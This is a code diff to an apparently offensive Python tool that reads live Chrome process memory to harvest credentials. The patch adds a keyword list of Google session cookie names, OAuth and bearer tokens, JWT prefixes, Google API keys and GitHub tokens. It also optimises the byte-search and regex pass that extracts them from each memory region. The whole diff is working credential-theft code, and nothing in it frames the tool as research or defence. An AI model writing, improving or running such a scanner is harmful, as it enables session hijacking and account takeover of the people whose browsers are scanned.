@@ -407,7 +407,27 @@ def extract_strings_from_map(handle: int, map_addr: int, all_regions: List[Tuple
     return strings
 
 
-# ──── Broad string scan (fast credential harvest) ────
+# ──── Fast pre-filter keyword list ────
+# These bytes appear in all high-value credentials. We byte-search first,
+# then only decode+regex the 512-byte context window around each hit.
+# This reduces the decoded text from 367 MB to a few KB per process.
+_PREFILTER_KEYWORDS: List[bytes] = [
+    b"SAPISID=", b"APISID=", b"__Secure-1PSID=", b"__Secure-3PSID=",
+    b"SSID=", b"HSID=", b"NID=", b"GAPS=",
+    b"Bearer ", b"bearer ", b"ya29.", b"access_token",
+    b"refresh_token", b"eyJhbGciOi", b"eyJhbGc",
+    b"AIza", b"ghp_", b"gho_", b"ghu_", b"ghs_",
+    b"SAPISIDHASH", b"f.sid", b"hpkePublicKey",
+    b"@gmail.com", b"@googlemail.com",
+    b"colab.research.google.com",
+    b"notebooklm.google.com",
+    b"m-s-", b"drive.google.com",
+    b"SID=A", b"SID=g", b"SID=e",
+    b"github.com/login",
+]
+_CONTEXT_WINDOW = 512  # bytes around each keyword hit to decode+regex
+
+
 def scan_region_for_credentials(
     data: bytes,
     region_base: int,
@@ -416,7 +436,9 @@ def scan_region_for_credentials(
 ) -> None:
     """Apply credential regex patterns to a raw memory region.
 
-    Also extracts printable strings above min_string_len for general intel.
+    Fast two-pass approach:
+    1. Byte-search for known credential keywords (microseconds per region)
+    2. Only decode+regex a small context window around each hit
 
     Args:
         data: Raw bytes of the region.
@@ -424,12 +446,37 @@ def scan_region_for_credentials(
         results: Dict accumulating findings by pattern name.
         min_string_len: Minimum printable string length to record.
     """
-    # Decode as latin-1 (handles all byte values without error)
-    try:
-        text = data.decode("latin-1")
-    except Exception:
+    # Collect candidate windows via fast byte search
+    hit_positions: set = set()
+    for keyword in _PREFILTER_KEYWORDS:
+        pos = 0
+        while True:
+            idx = data.find(keyword, pos)
+            if idx == -1:
+                break
+            # Add the window start (clamped)
+            win_start = max(0, idx - 64)
+            hit_positions.add(win_start)
+            pos = idx + 1
+
+    if not hit_positions:
+        return  # No credentials in this region
+
+    # Decode only the context windows and apply all regex patterns
+    decoded_windows: List[str] = []
+    for win_start in sorted(hit_positions):
+        win_end = min(len(data), win_start + _CONTEXT_WINDOW)
+        chunk = data[win_start:win_end]
+        try:
+            decoded_windows.append(chunk.decode("latin-1"))
+        except Exception:
+            pass
+
+    if not decoded_windows:
         return
 
+    # Combine small windows for a single regex pass per pattern
+    text = " ".join(decoded_windows)
     for name, pattern in CRED_PATTERNS.items():
         for match in pattern.finditer(text):
             hit = match.group(0).strip()
@@ -490,13 +537,22 @@ class ChromeLiveScanner:
             "strings_from_v8": [],
         }
 
+        # Max region size to read for credential scanning (large regions are
+        # mapped DLLs/executables which never contain live cookies or tokens)
+        MAX_REGION_BYTES = 16 * 1024 * 1024  # 16 MB
+
         try:
             # ── Phase 1: enumerate + read all readable regions ──
             logger.info("Enumerating memory regions for PID %d…", pid)
             all_regions: List[Tuple[int, bytes]] = []
             region_count = 0
+            skipped_large = 0
 
             for base, size in iter_readable_regions(handle):
+                if size > MAX_REGION_BYTES:
+                    skipped_large += 1
+                    continue
+
                 # Read in chunks to handle large regions
                 full_data = b""
                 remaining = size
@@ -516,8 +572,8 @@ class ChromeLiveScanner:
                     region_count += 1
 
             proc_results["regions_scanned"] = region_count
-            logger.info("PID %d: read %d regions, %.1f MB",
-                        pid, region_count, proc_results["bytes_read"] / 1e6)
+            logger.info("PID %d: read %d regions, %.1f MB (skipped %d large regions)",
+                        pid, region_count, proc_results["bytes_read"] / 1e6, skipped_large)
 
             # ── Phase 2: Broad credential string scan ──
             if string_scan:
